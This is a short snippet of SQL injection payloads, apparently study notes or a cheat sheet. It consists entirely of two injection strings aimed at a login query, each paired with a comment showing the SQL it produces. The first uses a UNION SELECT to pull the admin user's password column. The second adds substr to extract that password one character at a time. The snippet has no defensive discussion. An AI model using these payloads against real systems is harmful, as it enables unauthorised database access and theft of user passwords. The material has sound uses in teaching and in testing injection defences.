// union
' union select upw from user_table where uid='admin
// select uid from user_table where uid='' and upw='' union select upw from user_table where uid='admin'

// union with substr
" or "1" union select substr(upw,0,1) from users where uid="admin"--
// select upw from users where uid="admin" and upw="" or "1" union select substr(upw,0,1) from users where uid="admin"--"
